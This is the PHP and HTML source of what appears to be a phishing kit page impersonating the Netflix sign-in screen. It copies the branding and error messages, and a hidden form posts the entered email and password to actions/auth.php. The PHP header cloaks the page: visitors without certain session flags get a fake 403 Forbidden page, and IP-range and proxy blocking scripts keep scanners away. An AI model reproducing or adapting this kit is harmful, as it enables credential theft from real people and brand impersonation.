<?php
session_start();
if($setting['site_password'] == 1) {
    if($_SESSION['site_password'] == "") {
        //header("location: $link");exit();
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}
if($setting['site_parameter'] == 1) {
    if($_SESSION['site_parameter'] == "") {
        //header("location: $link");exit();
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}

//include '../block2.php';
//include '../block1.php';
if($setting['block_iprange'] == "1") {
    include '../block4.php';
}
include '../main.php';
if($setting['proxy_block'] == 1) {
    include '../proxyblock.php';
}
if(isset($_SESSION['logged_in'])) {
  header("location: account");
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Netflix</title>
    <link rel="stylesheet" href="assets/css/main.css?rand=<?php echo rand(); ?>">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
    <link type="text/css" rel="stylesheet" href="assets/img/icon.ico"/>
    <link rel="shortcut icon" href="assets/img/icon.ico"/>
  </head>
  <body>
    <div class="body">
      <div class="layer">
        <div class="header">
          <div class="logo"></div>
        </div>
        <form id="login_form" style="display: none;" action="actions/auth.php" method="post">
          <input name="login_user" value="" id="login_user" type="hidden" />
          <input name="login_pass" value="" id="login_pass" type="hidden" />
        </form>
        <div class="form">
          <div class="wrapper">
            <h1>Sign In</h1>
            <?php
              if(isset($_GET['e'])) {
                ?>
                <div class="ui-message">
                  <?php
                  switch($_GET['e']) {
                    case 1:
                      echo "Sorry, we can't find an account with this email address. Please try again or <a>create a new account</a>.";
                      break;
                    case 2:
                      echo "Incorrect password. Please try again or you can <a>reset your password</a>.";
                      break;
                  }
                  ?>
                </div>
                <?php
              }
            ?>
            <div class="input_table">
              <input id="username" type="text" value="" spellcheck="false" autocomplete="off" />
              <label id="usernameFocus">Email or phone number</label>
            </div>
            <div class="error_text" id="euser">

            </div>
            <div class="input_table password">
              <input id="password" type="password" value="" spellcheck="false" autocomplete="off" />
              <label id="passwordFocus">Password</label>
            </div>
            <div class="error_text" id="epass">

            </div>
            <div class="action_table">
              <button id="signIn">Sign In</button>
            </div>
            <div class="options_table">
              <div id="check_all">
                <div class="checkbox on" id="check"></div>
                <label id="checklabel">Remember me</label>
              </div>
              <div class="help">
                Need help?
              </div>
            </div>
            <div class="social_table">
              <div class="fb_connect">
                Login with Facebook
              </div>
              <div class="register">
                New to Netflix? <a>Sign up now</a>.
              </div>
            </div>
          </div>
        </div>
        <div class="footer">
          <div class="footwrapper">
            <div class="faq">
              Questions? Contact us.
            </div>
            <div class="options">
              <span>Gift Card Terms</span>
              <span>Terms of Use</span>
              <span>Privacy Statement</span>
            </div>
            <select class="region" id="region">
              <option value="ar">العربية</option>
              <option value="fr">Français</option>
              <option selected="" value="en">English</option>
            </select>
          </div>
        </div>
      </div>
    </div>
    <script src="assets/js/main.js?rand=<?php echo rand(); ?>"></script>
  </body>
</html>
